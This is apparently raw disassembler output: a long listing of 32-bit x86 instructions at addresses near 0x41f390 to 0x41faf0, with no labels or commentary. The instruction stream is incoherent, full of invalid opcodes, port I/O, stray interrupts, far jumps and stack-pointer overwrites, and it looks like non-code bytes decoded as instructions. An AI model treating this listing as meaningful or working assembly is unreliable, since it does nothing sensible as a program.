  41f390:	test   DWORD PTR [ebp-0x2d1b8725],eax
  41f396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f397:	stos   DWORD PTR es:[edi],eax
  41f398:	scas   eax,DWORD PTR es:[edi]
  41f399:	add    edi,DWORD PTR [eax+ebx*4-0x53]
  41f39d:	hlt    
  41f39e:	imul   ebx,edx,0x2b85cb93
  41f3a4:	or     ebp,eax
  41f3a6:	mov    dl,0xbb
  41f3a8:	push   edx
  41f3a9:	sahf   
  41f3aa:	fld    st(7)
  41f3ac:	push   0xc29cf71b
  41f3b1:	cmp    eax,DWORD PTR [ecx-0x54]
  41f3b4:	or     al,0x9e
  41f3b6:	adc    al,ch
  41f3b8:	add    ch,cl
  41f3ba:	mov    esi,0xeba1c554
  41f3bf:	mov    edi,0x382611d1
  41f3c4:	mov    esp,0xfa463925
  41f3c9:	mov    esp,0x35e09d41
  41f3ce:	add    eax,0xa8d6172b
  41f3d3:	outs   dx,DWORD PTR ds:[esi]
  41f3d4:	leave  
  41f3d5:	cmp    al,0x73
  41f3d7:	stos   BYTE PTR es:[edi],al
  41f3d8:	xchg   ch,bl
  41f3da:	in     eax,0xe6
  41f3dc:	jle    0x41f381
  41f3de:	out    dx,eax
  41f3df:	out    dx,eax
  41f3e0:	add    bl,dh
  41f3e2:	push   0xffffffb9
  41f3e4:	adc    eax,0xefad3296
  41f3e9:	pushf  
  41f3ea:	pop    es
  41f3eb:	aaa    
  41f3ec:	in     eax,0x8e
  41f3ee:	fbstp  TBYTE PTR [edi-0x62]
  41f3f1:	mov    dh,BYTE PTR [eax+edi*8]
  41f3f4:	push   edx
  41f3f5:	add    esi,DWORD PTR [ebp+0x1128f6e2]
  41f3fb:	mov    esp,0x2cac5bfe
  41f400:	aad    0xe4
  41f402:	xor    esi,DWORD PTR [esp+ecx*2]
  41f405:	mov    ebp,?
  41f407:	xchg   esp,eax
  41f408:	test   BYTE PTR [ebp+0x54],dh
  41f40b:	gs loop 0x41f40f
  41f40e:	lods   al,BYTE PTR ds:[esi]
  41f40f:	out    0xeb,al
  41f411:	scas   eax,DWORD PTR es:[edi]
  41f412:	xchg   DWORD PTR [ebp+0x281ec197],edx
  41f418:	lea    edi,[esi+0xff1e42d]
  41f41e:	mov    al,ds:0x7cbd1093
  41f423:	idiv   DWORD PTR [edx+eiz*2-0x78ab8549]
  41f42a:	dec    esp
  41f42b:	call   0xe1d6f4d9
  41f430:	jmp    0x41f448
  41f432:	retf   0xb35a
  41f435:	xchg   ah,ah
  41f437:	dec    esi
  41f438:	sub    ch,BYTE PTR [esi+ecx*1+0x4623108c]
  41f43f:	sub    ecx,DWORD PTR [edx-0x15]
  41f442:	aaa    
  41f443:	fwait
  41f444:	adc    eax,ebp
  41f446:	or     al,0x3e
  41f448:	jp     0x41f3d4
  41f44a:	dec    edi
  41f44b:	adc    ah,bh
  41f44d:	mov    edi,0x2560247e
  41f452:	xchg   edi,eax
  41f453:	idiv   BYTE PTR [edi-0x33]
  41f456:	mov    ?,WORD PTR [ecx+0x3ee56f98]
  41f45c:	dec    esi
  41f45d:	arpl   WORD PTR [ebp-0x5c],dx
  41f460:	lods   eax,DWORD PTR ds:[esi]
  41f461:	(bad)
  41f465:	sub    ebx,DWORD PTR [ebp-0x31d4d5bb]
  41f46b:	push   esp
  41f46c:	mov    esp,0x52562596
  41f471:	push   ecx
  41f472:	add    eax,0x2f3d8fb
  41f477:	int    0x4b
  41f479:	and    BYTE PTR [eax+eax*2-0x4e5b6145],dl
  41f480:	cmp    BYTE PTR [eax+0x5e],cl
  41f483:	xchg   ecx,eax
  41f484:	push   ss
  41f485:	ins    BYTE PTR es:[edi],dx
  41f486:	pop    edx
  41f487:	sbb    dh,BYTE PTR cs:[edi-0x5c]
  41f48b:	push   0x6486e13d
  41f490:	iret   
  41f491:	jmp    0x3334:0xfa6182e5
  41f498:	inc    ebx
  41f499:	in     al,dx
  41f49a:	jmp    0xc3d7f27d
  41f49f:	dec    edi
  41f4a0:	pop    es
  41f4a1:	ins    DWORD PTR es:[edi],dx
  41f4a2:	pop    gs
  41f4a4:	lds    eax,FWORD PTR [ecx]
  41f4a6:	js     0x41f42d
  41f4a8:	and    eax,DWORD PTR [edi]
  41f4aa:	jo     0x41f489
  41f4ac:	in     al,dx
  41f4ad:	cli    
  41f4ae:	adc    dl,BYTE PTR [ecx+eiz*2]
  41f4b1:	loop   0x41f489
  41f4b3:	add    esp,DWORD PTR [ecx-0x25]
  41f4b6:	scas   eax,DWORD PTR es:[edi]
  41f4b7:	xor    esp,esp
  41f4b9:	stc    
  41f4ba:	lods   al,BYTE PTR ds:[esi]
  41f4bb:	pop    ebp
  41f4bc:	sub    eax,0x713f33a3
  41f4c1:	cwde   
  41f4c2:	std    
  41f4c3:	popf   
  41f4c4:	mov    eax,ds:0xd54fb147
  41f4c9:	inc    edx
  41f4ca:	je     0x41f503
  41f4cc:	jne    0x41f4fb
  41f4ce:	cmp    DWORD PTR [edx+edx*1+0x58],ebp
  41f4d2:	pop    eax
  41f4d3:	add    eax,0x50e55002
  41f4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4d9:	inc    ecx
  41f4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4db:	add    eax,0xa65fdcf
  41f4e0:	inc    esi
  41f4e1:	les    eax,FWORD PTR [eax-0x26]
  41f4e4:	stc    
  41f4e5:	ss push eax
  41f4e7:	inc    edx
  41f4e8:	(bad)  
  41f4ea:	sahf   
  41f4eb:	and    al,0xde
  41f4ed:	test   al,0x4e
  41f4ef:	cmovp  edx,DWORD PTR [esi+0x6a]
  41f4f3:	imul   ecx,DWORD PTR [edx+0x18dc1989],0xffffff9e
  41f4fa:	pop    ebx
  41f4fb:	ins    DWORD PTR es:[edi],dx
  41f4fc:	enter  0x44eb,0x7f
  41f500:	jns    0x41f4a1
  41f502:	int3   
  41f503:	jns    0x41f51a
  41f505:	ja     0x41f495
  41f507:	or     eax,0x8855a69
  41f50c:	or     edx,DWORD PTR ds:[eax]
  41f50f:	rcr    edi,0xdd
  41f512:	push   esi
  41f513:	fld    st(5)
  41f515:	lea    eax,[ecx+0x3d]
  41f518:	sub    DWORD PTR [ebx+eax*8+0x42e2eb75],ebx
  41f51f:	fild   QWORD PTR [ebx]
  41f521:	arpl   WORD PTR [ecx+0x36],di
  41f524:	aas    
  41f525:	cmp    BYTE PTR [ebp+0x4a33d53b],bh
  41f52b:	or     ch,BYTE PTR [ebp+0x4c]
  41f52e:	in     al,0x56
  41f530:	pop    eax
  41f531:	in     eax,0x7e
  41f533:	push   eax
  41f534:	ret    0x993c
  41f537:	stos   DWORD PTR es:[edi],eax
  41f538:	dec    edx
  41f539:	call   0x28a8ab7e
  41f53e:	mov    esi,DWORD PTR [esi+0x60]
  41f541:	ins    BYTE PTR es:[edi],dx
  41f542:	pop    ebx
  41f543:	ins    BYTE PTR es:[edi],dx
  41f544:	in     al,0xdf
  41f546:	and    BYTE PTR [edx+0x61],ch
  41f549:	lock xchg esp,eax
  41f54b:	cmp    al,0xa8
  41f54d:	sub    bl,BYTE PTR [esi-0xc]
  41f550:	adc    DWORD PTR [ebx],esp
  41f552:	call   0x6e07:0xdc936254
  41f559:	and    DWORD PTR [eax],ebx
  41f55b:	mov    bl,0xd8
  41f55d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f55e:	imul   esi,edi,0xd365873
  41f564:	mov    ebx,0x56f74e11
  41f569:	xchg   ebx,eax
  41f56a:	push   ebx
  41f56b:	ucomiss xmm7,DWORD PTR [esi]
  41f56e:	or     eax,0x99ae75f
  41f573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f574:	sub    al,ah
  41f576:	loopne 0x41f50b
  41f578:	data16 xor ah,ch
  41f57b:	cmp    BYTE PTR [edi],0x25
  41f57e:	sbb    DWORD PTR [ebp-0x43],ebp
  41f581:	add    al,0x56
  41f583:	lahf   
  41f584:	add    ebx,ebx
  41f586:	ins    DWORD PTR es:[edi],dx
  41f587:	pop    ss
  41f588:	sub    DWORD PTR [esi],ebx
  41f58a:	xchg   esp,eax
  41f58b:	mov    ds:0x78e6faab,al
  41f590:	jp     0x41f5a2
  41f592:	sahf   
  41f593:	jo     0x41f558
  41f595:	js     0x41f51b
  41f597:	shl    bh,0x49
  41f59a:	scas   al,BYTE PTR es:[edi]
  41f59b:	add    eax,0xef47c94
  41f5a0:	lods   al,BYTE PTR ds:[esi]
  41f5a1:	(bad)  
  41f5a2:	jnp    0x41f5e0
  41f5a4:	sbb    cl,bh
  41f5a6:	leave  
  41f5a7:	pop    ebp
  41f5a8:	int3   
  41f5a9:	pop    edx
  41f5aa:	add    eax,0xbbeed4da
  41f5af:	push   es
  41f5b0:	cdq    
  41f5b1:	jb     0x41f540
  41f5b3:	mov    DWORD PTR [esi+edx*2+0x57],edi
  41f5b7:	test   al,0xe6
  41f5b9:	ud2    
  41f5bb:	and    bh,0xea
  41f5be:	pop    ebp
  41f5bf:	scas   eax,DWORD PTR es:[edi]
  41f5c0:	push   es
  41f5c1:	and    edi,DWORD PTR [eax-0x1e49ce2b]
  41f5c7:	idiv   BYTE PTR [esi+edx*4-0x33]
  41f5cb:	mov    ds:0xcab6c4ff,eax
  41f5d0:	pop    ds
  41f5d1:	enter  0x80ff,0xe9
  41f5d5:	xlat   BYTE PTR ds:[ebx]
  41f5d6:	jb     0x41f5a1
  41f5d8:	push   ds
  41f5d9:	in     eax,dx
  41f5da:	cmp    eax,0x3ee78abc
  41f5df:	ret    0xf171
  41f5e2:	mov    al,0x76
  41f5e4:	clc    
  41f5e5:	shl    BYTE PTR [ebp+0x35a03ee2],1
  41f5eb:	adc    eax,0x3811ee79
  41f5f0:	test   DWORD PTR [edi],ebx
  41f5f2:	and    eax,0x92bc14a0
  41f5f7:	daa    
  41f5f8:	(bad)  
  41f5f9:	xchg   esi,eax
  41f5fa:	pop    eax
  41f5fb:	pushf  
  41f5fc:	jg     0x41f65b
  41f5fe:	ins    DWORD PTR es:[edi],dx
  41f5ff:	adc    dh,BYTE PTR [ebx]
  41f601:	jp     0x41f5f4
  41f603:	jge    0x41f5e6
  41f605:	repnz pop ebp
  41f607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f608:	mov    cl,BYTE PTR [ebp+0x6e7cedbe]
  41f60e:	sbb    BYTE PTR [ebp+0x54],ah
  41f611:	imul   esp,DWORD PTR [ebp-0x77092b7],0x8
  41f618:	inc    ebx
  41f619:	inc    eax
  41f61b:	scas   eax,DWORD PTR es:[edi]
  41f61c:	ret    0x4c8d
  41f61f:	in     eax,dx
  41f620:	cli    
  41f621:	adc    esi,DWORD PTR [edi]
  41f623:	dec    eax
  41f624:	mov    dh,0x92
  41f626:	aaa    
  41f627:	pushf  
  41f628:	dec    esi
  41f629:	dec    edi
  41f62a:	adc    esi,edx
  41f62c:	mov    ebx,0x938b73c8
  41f631:	lods   al,BYTE PTR ds:[esi]
  41f632:	dec    ebp
  41f633:	jnp    0x41f651
  41f635:	loopne 0x41f6aa
  41f637:	xchg   edx,eax
  41f638:	fadd   QWORD PTR [eax+0x58]
  41f63b:	into   
  41f63c:	inc    esp
  41f63d:	ret    
  41f63e:	popf   
  41f63f:	push   ecx
  41f640:	(bad)  
  41f641:	not    BYTE PTR [edx-0x3649cf8c]
  41f647:	jp     0x41f6bc
  41f649:	sahf   
  41f64a:	mov    edi,esp
  41f64c:	add    ebx,DWORD PTR [edi+esi*4+0x44]
  41f650:	out    dx,al
  41f651:	lea    ebp,[esi+0x1c52ccac]
  41f657:	dec    eax
  41f658:	cli    
  41f659:	xchg   ecx,eax
  41f65a:	add    BYTE PTR [ebx],ah
  41f65c:	adc    eax,0x70778b1e
  41f661:	outs   dx,DWORD PTR ds:[esi]
  41f662:	(bad)  
  41f664:	push   ss
  41f665:	shr    ecx,cl
  41f667:	inc    eax
  41f668:	xor    ecx,DWORD PTR [esp+esi*1+0x2f]
  41f66c:	aad    0x17
  41f66e:	jb     0x41f630
  41f670:	pop    ss
  41f671:	xchg   esp,eax
  41f672:	mov    cl,0x53
  41f674:	int3   
  41f675:	call   0x6877:0xd6781aae
  41f67c:	dec    edi
  41f67d:	xor    DWORD PTR [edx],ebx
  41f67f:	ret    0xe680
  41f682:	lahf   
  41f683:	mov    ds:0xe938bfb8,eax
  41f688:	dec    edx
  41f689:	adc    eax,0xa5db199c
  41f68e:	mov    bl,0x72
  41f690:	lahf   
  41f691:	shr    BYTE PTR [ecx+edi*4-0x41],0xab
  41f696:	(bad)  
  41f697:	std    
  41f698:	fisubr WORD PTR [ebx+edx*8]
  41f69b:	jecxz  0x41f662
  41f69d:	sbb    BYTE PTR [ebp+0x6e0473fd],0x33
  41f6a4:	aam    0xc9
  41f6a6:	(bad)  
  41f6a8:	mov    esp,0x8dcb17bb
  41f6ad:	adc    eax,0xbf6af8fd
  41f6b2:	data16 sbb dl,dh
  41f6b5:	lods   eax,DWORD PTR ds:[esi]
  41f6b6:	lods   eax,DWORD PTR ds:[esi]
  41f6b7:	or     BYTE PTR [edx+eax*2-0x80],dh
  41f6bb:	jg     0x41f6e5
  41f6bd:	jbe    0x41f680
  41f6bf:	and    al,0x66
  41f6c1:	add    BYTE PTR [eax-0x60eb5b7b],0xda
  41f6c8:	gs xchg ebp,edi
  41f6cb:	ret    
  41f6cc:	lea    ebx,[ebx+0x54]
  41f6cf:	add    al,0xd1
  41f6d1:	rcr    DWORD PTR ds:0x3009eb9a,1
  41f6d7:	scas   al,BYTE PTR es:[edi]
  41f6d8:	jl     0x41f734
  41f6da:	imul   eax,DWORD PTR [edi],0x8b80b389
  41f6e0:	js     0x41f6b0
  41f6e2:	call   DWORD PTR [ebx-0x70]
  41f6e5:	push   0x1d
  41f6e7:	add    al,0x4a
  41f6e9:	stos   BYTE PTR es:[edi],al
  41f6ea:	and    BYTE PTR [ebp+0x5e],bh
  41f6ed:	das    
  41f6ee:	push   es
  41f6ef:	sbb    BYTE PTR [edi+0x5c],ch
  41f6f2:	clc    
  41f6f3:	stos   BYTE PTR es:[edi],al
  41f6f4:	retf   0xc79a
  41f6f7:	call   0x5be1:0x78cec213
  41f6fe:	in     eax,0x66
  41f700:	dec    edi
  41f702:	in     eax,0x7f
  41f704:	sbb    BYTE PTR [edi-0x46ae4267],0xa2
  41f70b:	mov    esp,0x1d7bf804
  41f710:	cmp    BYTE PTR [esi-0x1876fae0],ah
  41f716:	ins    BYTE PTR es:[edi],dx
  41f717:	gs push edx
  41f719:	mov    esp,DWORD PTR [ebx-0x42]
  41f71c:	xchg   edi,eax
  41f71d:	mov    ds:0x897a06f8,al
  41f722:	repz cmc 
  41f724:	jne    0x41f74f
  41f726:	sbb    BYTE PTR [ebx+0x4c49d680],cl
  41f72c:	mov    bh,0x52
  41f72e:	add    bh,BYTE PTR [edx+eax*1-0x52]
  41f732:	hlt    
  41f733:	sbb    eax,DWORD PTR [edi-0x630b02a4]
  41f739:	fst    DWORD PTR [edi]
  41f73b:	cwde   
  41f73c:	cmp    ah,0xfa
  41f73f:	inc    eax
  41f740:	xlat   BYTE PTR ds:[ebx]
  41f741:	cmp    DWORD PTR [edx+0x5f],edi
  41f744:	dec    edi
  41f745:	jns    0x41f7a6
  41f747:	fbld   TBYTE PTR [edx-0x13]
  41f74a:	rcl    BYTE PTR [eax*8-0x691e7dd4],cl
  41f751:	xor    al,0x9e
  41f753:	xor    cl,BYTE PTR [ebx+edx*4]
  41f756:	dec    eax
  41f757:	mov    eax,ds:0x606cf902
  41f75c:	mov    eax,ds:0x8a810c29
  41f761:	inc    edx
  41f762:	pop    edx
  41f763:	jae    0x41f710
  41f765:	xor    edi,DWORD PTR [esi]
  41f767:	xchg   ebp,eax
  41f768:	aam    0xfa
  41f76a:	adc    DWORD PTR [edi-0x1c],edi
  41f76d:	cmp    BYTE PTR [ecx+0x7a],bh
  41f770:	aad    0x6c
  41f772:	popa   
  41f773:	rol    ebx,cl
  41f775:	das    
  41f776:	jb     0x41f75d
  41f778:	mov    BYTE PTR [edx],ah
  41f77a:	jns    0x41f78c
  41f77c:	hlt    
  41f77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f77e:	xor    esp,ecx
  41f780:	(bad)  
  41f781:	push   DWORD PTR [ebx-0x12203fd1]
  41f787:	mov    ah,0x5a
  41f789:	fwait
  41f78a:	pop    ecx
  41f78b:	arpl   WORD PTR [ecx-0x72],di
  41f78e:	in     eax,0x50
  41f790:	sub    al,0xc
  41f792:	mov    edi,DWORD PTR [edx-0x1cd0a1b4]
  41f798:	jae    0x41f7fd
  41f79a:	mov    DWORD PTR [ebx+0x14],ecx
  41f79d:	inc    ch
  41f79f:	cmp    BYTE PTR ss:[esi+0x16],al
  41f7a3:	lahf   
  41f7a4:	inc    esp
  41f7a5:	mov    al,ds:0x93fe67f5
  41f7aa:	cmp    BYTE PTR [edi+0x10ff720e],bh
  41f7b0:	mov    dh,0x8c
  41f7b2:	mov    dh,0x4b
  41f7b4:	push   0x2
  41f7b6:	dec    esi
  41f7b7:	sbb    BYTE PTR [edi-0x14],0x3a
  41f7bb:	jecxz  0x41f747
  41f7bd:	int3   
  41f7be:	les    edi,FWORD PTR [ecx-0x3ef1015a]
  41f7c4:	pop    ss
  41f7c5:	shr    BYTE PTR [ebp-0xb09fa0c],0x5c
  41f7cc:	mov    bl,0xe3
  41f7ce:	add    eax,0xc781ff8
  41f7d3:	fiadd  WORD PTR [ecx+0x540417d5]
  41f7d9:	jns    0x41f81f
  41f7db:	daa    
  41f7dc:	xor    DWORD PTR [edx-0x39],ebx
  41f7df:	pusha  
  41f7e0:	add    bl,BYTE PTR [edi-0x58]
  41f7e3:	sti    
  41f7e4:	xchg   edi,eax
  41f7e5:	ss lahf 
  41f7e7:	cmp    eax,0xfafbbef1
  41f7ec:	push   0xefc6dc03
  41f7f1:	retf   0xc6e9
  41f7f4:	pop    esp
  41f7f5:	sbb    esi,DWORD PTR [eax]
  41f7f7:	inc    eax
  41f7f8:	jb     0x41f7d7
  41f7fa:	push   ss
  41f7fb:	stc    
  41f7fc:	loopne 0x41f7b4
  41f7fe:	ret    0x3fd0
  41f801:	popf   
  41f802:	and    eax,0xe48ec0a4
  41f807:	push   esp
  41f808:	lahf   
  41f809:	adc    DWORD PTR [eax],ebp
  41f80b:	in     eax,0xa1
  41f80d:	(bad)  
  41f80e:	jns    0x41f861
  41f810:	push   ebx
  41f811:	cdq    
  41f812:	lds    esp,FWORD PTR [ebx-0x30]
  41f815:	mov    BYTE PTR [edi],ch
  41f817:	inc    eax
  41f818:	or     ecx,DWORD PTR ds:0x527abee1
  41f81e:	into   
  41f81f:	cmp    BYTE PTR [ecx+0x52],dh
  41f822:	push   esp
  41f823:	(bad)
  41f826:	jge    0x41f86d
  41f828:	xchg   esp,edx
  41f82a:	mov    WORD PTR [ecx-0x1fbee60c],ds
  41f830:	push   edx
  41f831:	cmc    
  41f832:	jae    0x41f8a9
  41f834:	popf   
  41f835:	adc    esi,esi
  41f837:	pop    esp
  41f838:	mov    esi,0x5d2cff04
  41f83d:	jge    0x41f827
  41f83f:	mov    ebx,edi
  41f841:	or     bh,ah
  41f843:	mov    ebp,0xe37c4b5b
  41f848:	add    al,0xaa
  41f84a:	ds push edx
  41f84c:	test   al,0x5a
  41f84e:	or     ch,bl
  41f850:	xchg   edx,eax
  41f851:	(bad)  
  41f852:	jecxz  0x41f8be
  41f854:	sub    DWORD PTR [ebx-0x17],edx
  41f857:	loopne 0x41f881
  41f859:	nop
  41f85a:	push   cs
  41f85b:	mov    edx,0x585193ad
  41f860:	inc    edx
  41f861:	imul   ecx,DWORD PTR [ecx-0x62cf7ee],0xdaae362e
  41f86b:	xchg   esi,eax
  41f86c:	(bad)  
  41f86d:	fcomip st,st(7)
  41f86f:	lds    esp,FWORD PTR [edx+0x10]
  41f872:	rcl    ch,0xed
  41f875:	and    eax,0x714248c9
  41f87a:	addr16 imul esi,edi,0x538948ba
  41f881:	adc    eax,0xb82a9436
  41f886:	adc    eax,0x461982ee
  41f88b:	mov    ch,0xe9
  41f88d:	jecxz  0x41f82c
  41f88f:	(bad)  
  41f890:	fsubr  DWORD PTR [ecx-0x49c43814]
  41f896:	mov    ebx,DWORD PTR [eax-0x7b]
  41f899:	cs add eax,0xc993b41f
  41f89f:	cmp    ebx,DWORD PTR [ebp-0x28]
  41f8a2:	lock or DWORD PTR [edi-0x4a],edi
  41f8a6:	push   edx
  41f8a7:	in     eax,dx
  41f8a8:	jbe    0x41f892
  41f8aa:	jmp    0xddde:0x4e861312
  41f8b1:	nop
  41f8b2:	jg     0x41f874
  41f8b4:	lds    ebp,FWORD PTR [eax+ebp*2-0x762d9120]
  41f8bb:	arpl   WORD PTR [eax-0x11],dx
  41f8be:	xor    ebp,ebp
  41f8c0:	mov    ch,0x2f
  41f8c2:	clc    
  41f8c3:	outs   dx,BYTE PTR ds:[esi]
  41f8c4:	push   0x9722391b
  41f8c9:	push   0xffffffb0
  41f8cb:	repz add BYTE PTR [ebp-0x749df01f],0xf3
  41f8d3:	pop    ds
  41f8d4:	jge    0x41f8c8
  41f8d6:	lods   eax,DWORD PTR ds:[esi]
  41f8d7:	xchg   esi,eax
  41f8d8:	aaa    
  41f8d9:	scas   eax,DWORD PTR es:[edi]
  41f8da:	push   ebp
  41f8db:	cmp    ch,BYTE PTR [esi+0x6ea97ebb]
  41f8e1:	fyl2xp1 
  41f8e3:	cmp    eax,0xa61dcad3
  41f8e8:	and    ebp,DWORD PTR [edx+ebx*2]
  41f8eb:	lea    esi,[edx-0x1f2c72ae]
  41f8f1:	mov    al,ds:0x408d901e
  41f8f6:	adc    cl,BYTE PTR [edi+0x2d58c730]
  41f8fc:	jae    0x41f92f
  41f8fe:	add    ch,BYTE PTR ds:0x4a7fe84f
  41f904:	jecxz  0x41f8c4
  41f906:	dec    ebx
  41f907:	cdq    
  41f908:	mov    ecx,DWORD PTR [eax]
  41f90a:	pop    edx
  41f90b:	mov    al,ds:0x963f775b
  41f910:	dec    esp
  41f911:	pop    ss
  41f912:	sbb    DWORD PTR [ebp+esi*4+0x38b46769],ebx
  41f919:	aas    
  41f91a:	add    DWORD PTR [ebx],esp
  41f91c:	jmp    0x41f917
  41f91e:	or     BYTE PTR [edx-0x4a],ah
  41f921:	add    DWORD PTR [eax+0x5e],edi
  41f924:	daa    
  41f925:	pop    ebx
  41f926:	int    0x9a
  41f928:	fnstenv [esi-0x3f557ba7]
  41f92e:	inc    ebx
  41f92f:	loope  0x41f992
  41f931:	mov    dl,dh
  41f933:	ja     0x41f95d
  41f935:	and    eax,eax
  41f937:	cmp    al,0x7d
  41f939:	int    0xa7
  41f93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f93c:	loopne 0x41f951
  41f93e:	sbb    DWORD PTR [eax+ebp*8+0x52db45d6],eax
  41f945:	mov    dh,0xf9
  41f947:	xor    DWORD PTR [edx],0x427f844a
  41f94d:	mov    ds:0x16325a35,al
  41f952:	test   ebx,ebx
  41f954:	int    0xef
  41f956:	je     0x41f950
  41f958:	or     ah,BYTE PTR [edx-0x1f]
  41f95b:	push   edi
  41f95c:	inc    ebp
  41f95d:	mov    eax,0x1bcd2a9c
  41f962:	sub    al,0x9d
  41f964:	(bad)  
  41f965:	arpl   bp,bx
  41f967:	mov    esp,0xc003fe0d
  41f96c:	jmp    0x41f9a7
  41f96e:	push   esp
  41f96f:	cs lock jb 0x41f9ca
  41f973:	and    al,0x28
  41f975:	push   ebp
  41f976:	mov    BYTE PTR [edi],bl
  41f978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f979:	mov    eax,0x92f4862
  41f97e:	fldcw  WORD PTR [ecx+0x44]
  41f981:	out    dx,al
  41f982:	cmp    eax,DWORD PTR [edi+0x59]
  41f985:	into   
  41f986:	in     al,0xbe
  41f988:	jmp    0x41f911
  41f98a:	test   bh,ah
  41f98c:	in     al,0x8
  41f98e:	jge    0x41f972
  41f990:	xchg   bh,dh
  41f992:	or     BYTE PTR [eax+0x4f971f0e],0xf6
  41f999:	imul   eax,DWORD PTR [eax-0x606893a8],0x17
  41f9a0:	or     eax,0x682cbb84
  41f9a5:	cmp    eax,0xe9669d0f
  41f9aa:	int    0xdc
  41f9ac:	imul   esi,ebp,0x6e91323e
  41f9b2:	cwde   
  41f9b3:	mov    edx,0xf1199fb
  41f9b8:	jmp    0x2d332e0c
  41f9bd:	test   eax,ecx
  41f9bf:	js     0x41f985
  41f9c1:	pop    ds
  41f9c2:	ss icebp 
  41f9c4:	jmp    0x41fa1e
  41f9c6:	ins    BYTE PTR es:[edi],dx
  41f9c7:	sub    DWORD PTR [ecx+0x0],0xe520f64c
  41f9ce:	loopne 0x41fa00
  41f9d0:	out    dx,eax
  41f9d1:	sti    
  41f9d2:	push   ds
  41f9d3:	fimul  WORD PTR [ecx-0x50]
  41f9d6:	adc    DWORD PTR [esi-0xde92f8f],esp
  41f9dc:	mov    bh,0xc7
  41f9de:	jp     0x41fa48
  41f9e0:	ja     0x41fa30
  41f9e2:	and    al,0x66
  41f9e4:	jecxz  0x41f982
  41f9e6:	mov    BYTE PTR [esi+0x1a3f9f55],cl
  41f9ec:	add    DWORD PTR [edi-0x6],ebp
  41f9ef:	sar    BYTE PTR [edx+0x30692fcb],0xc4
  41f9f6:	mov    bh,0x60
  41f9f8:	in     eax,0xb9
  41f9fa:	jp     0x41fa41
  41f9fc:	outs   dx,BYTE PTR ds:[esi]
  41f9fd:	mov    edi,0xd08b6b9e
  41fa02:	das    
  41fa03:	call   0x779dc89
  41fa08:	test   BYTE PTR [ecx-0x7f],ch
  41fa0b:	rcl    DWORD PTR [eax+0x754e49eb],1
  41fa11:	inc    ebp
  41fa12:	sub    ah,cl
  41fa14:	jae    0x41fa81
  41fa16:	mov    bl,0x4b
  41fa18:	outs   dx,DWORD PTR ds:[esi]
  41fa19:	mov    dh,BYTE PTR [esi+0x5a]
  41fa1c:	fcmove st,st(2)
  41fa1e:	adc    bl,BYTE PTR [eax]
  41fa20:	mov    bh,0x4b
  41fa22:	nop
  41fa23:	jp     0x41fa45
  41fa25:	jnp    0x41f9c4
  41fa27:	neg    BYTE PTR [ebx+0x1a]
  41fa2a:	mov    WORD PTR [esi],cs
  41fa2c:	fdivr  DWORD PTR [edx+0x33]
  41fa2f:	mov    eax,0xea2f4e60
  41fa34:	fstp   QWORD PTR [ecx]
  41fa36:	fnstsw WORD PTR [ebx]
  41fa38:	(bad)  
  41fa3a:	aad    0x44
  41fa3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa3d:	jmp    0x41fa45
  41fa3f:	mov    dh,0xa8
  41fa41:	push   ds
  41fa42:	js     0x41fa9a
  41fa44:	inc    ebx
  41fa45:	loopne 0x41fa66
  41fa47:	add    DWORD PTR [ecx-0x3a],edi
  41fa4a:	jmp    0x9de8:0x75fe3312
  41fa51:	repz push ebx
  41fa53:	or     ebp,ecx
  41fa55:	fist   DWORD PTR [ebp+0x28f4d2ac]
  41fa5b:	(bad)  
  41fa5d:	bound  eax,QWORD PTR [ebp-0x17]
  41fa60:	pop    esp
  41fa61:	shr    DWORD PTR [edi-0x3e64e345],cl
  41fa67:	mov    ecx,0x32557b40
  41fa6c:	xor    eax,0xafc3bd84
  41fa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa72:	push   ecx
  41fa73:	sti    
  41fa74:	push   esi
  41fa75:	sahf   
  41fa76:	js     0x41fad1
  41fa78:	cdq    
  41fa79:	pop    esp
  41fa7a:	retf   
  41fa7b:	push   edi
  41fa7c:	mov    bh,0x17
  41fa7e:	fcom   QWORD PTR [esi]
  41fa80:	daa    
  41fa81:	scas   eax,DWORD PTR es:[edi]
  41fa82:	ror    DWORD PTR [edx],0x97
  41fa85:	lods   al,BYTE PTR ds:[esi]
  41fa86:	(bad)  
  41fa87:	cld    
  41fa88:	fiadd  DWORD PTR [eax]
  41fa8a:	sbb    BYTE PTR [ecx-0x6c393049],bl
  41fa90:	stos   BYTE PTR es:[edi],al
  41fa91:	xor    eax,0x8df9ba49
  41fa96:	jmp    0x41fa45
  41fa98:	mov    bh,0x12
  41fa9a:	push   ebp
  41fa9b:	pop    esp
  41fa9c:	imul   ecx,eax,0x6011ef1c
  41faa2:	cs hlt 
  41faa4:	retf   0xa6a
  41faa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faa8:	les    eax,FWORD PTR [esi-0x3b]
  41faab:	xchg   esi,eax
  41faac:	push   ss
  41faad:	shr    esp,cl
  41faaf:	jecxz  0x41fab8
  41fab1:	xchg   ebx,eax
  41fab2:	jno    0x41fa5c
  41fab4:	dec    ebp
  41fab5:	(bad)  
  41fab6:	sub    ah,ah
  41fab8:	push   edx
  41fab9:	xor    eax,0xd7f3fd69
  41fabe:	pop    eax
  41fabf:	out    0x11,al
  41fac1:	sbb    cl,0x94
  41fac4:	jge    0x41fa4d
  41fac6:	xchg   esp,eax
  41fac7:	je     0x41fabf
  41fac9:	lock sti 
  41facb:	mov    edx,0x40a3b0aa
  41fad0:	ficomp DWORD PTR [edi-0x34]
  41fad3:	pop    edx
  41fad4:	and    esp,DWORD PTR [edi+0x65]
  41fad7:	pop    ebx
  41fad8:	fs call 0xd048:0x2be9771
  41fae0:	mov    ebp,0xd290fc38
  41fae5:	inc    edx
  41fae6:	test   DWORD PTR [esi+ebp*8+0x1],esp
  41faea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faeb:	mov    bh,0x5c
  41faed:	fdivr  st(1),st
  41faef:	aaa    
  41faf0:	add    eax,0xb7c4bcfc
